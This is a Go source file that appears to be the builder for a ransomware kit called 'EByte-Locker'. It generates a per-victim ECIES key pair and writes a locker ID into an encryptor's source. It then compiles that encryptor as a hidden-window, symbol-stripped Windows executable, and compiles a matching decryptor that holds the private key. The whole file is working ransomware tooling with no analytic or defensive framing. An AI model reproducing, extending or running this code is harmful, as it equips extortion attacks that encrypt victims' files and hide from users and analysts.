package handlers

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"time"

	eciesgo "github.com/ecies/go"
)

func GenerateLocker(lockerID string) error {
	clearConsole()

	priv, pub, err := generateECIESKeyPair()
	if err != nil {
		return fmt.Errorf("error generating ECIES key pair: %w", err)
	}

	fmt.Printf("Private Key (Hex): %s\n", priv.Hex())
	fmt.Printf("Public Key (Hex): %s\n", pub.Hex(false))

	if err := compileEncryptor(pub.Hex(false), lockerID); err != nil {
		return fmt.Errorf("error compiling encryptor: %w", err)
	}

	if err := compileDecryptor(priv.Hex()); err != nil {
		return fmt.Errorf("error compiling decryptor: %w", err)
	}

	fmt.Println("Locker generation successful")
	return nil
}

func generateECIESKeyPair() (*eciesgo.PrivateKey, *eciesgo.PublicKey, error) {
	key, err := eciesgo.GenerateKey()
	if err != nil {
		return nil, nil, err
	}
	return key, key.PublicKey, nil
}

func compileEncryptor(pubKeyHex string, lockerID string) error {
	fmt.Println("Compiling Encryptor...")
	startTime := time.Now()

	originalDir, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("failed to get current directory: %w", err)
	}
	defer os.Chdir(originalDir) 

	if err := os.Chdir("Encryptor"); err != nil {
		return fmt.Errorf("failed to change directory to Encryptor: %w", err)
	}

	err = replaceLockerIDInEncryptor(lockerID)
	if err != nil {
		return fmt.Errorf("failed to replace Locker ID in Encryptor: %w", err)
	}

	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Locker/configuration.PublicKey=%s'", pubKeyHex)
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../EByteLocker-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	fmt.Printf("Encryptor compiled successfully in %v\n", time.Since(startTime))
	return nil
}

func replaceLockerIDInEncryptor(lockerID string) error {
	sourceFile := "main.go"
	content, err := os.ReadFile(sourceFile)
	if err != nil {
		return fmt.Errorf("failed to read Encryptor source file: %w", err)
	}

	updatedContent := bytes.ReplaceAll(content, []byte(`%BYTELOCKER_KEY_HERE%`), []byte(lockerID))

	if err := os.WriteFile(sourceFile, updatedContent, 0644); err != nil {
		return fmt.Errorf("failed to write updated content to Encryptor source file: %w", err)
	}

	fmt.Println("Locker ID successfully injected into Encryptor")
	return nil
}

func compileDecryptor(privKeyHex string) error {
	fmt.Println("Compiling Decryptor...")
	startTime := time.Now()

	originalDir, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("failed to get current directory: %w", err)
	}
	defer os.Chdir(originalDir)

	if err := os.Chdir("Decryptor"); err != nil {
		return fmt.Errorf("failed to change directory to Decryptor: %w", err)
	}

	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'EByte-Locker/configuration.PrivateKey=%s'", privKeyHex)
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Decryptor-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	fmt.Printf("Decryptor compiled successfully in %v\n", time.Since(startTime))
	return nil
}

func clearConsole() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	_ = cmd.Run()
}
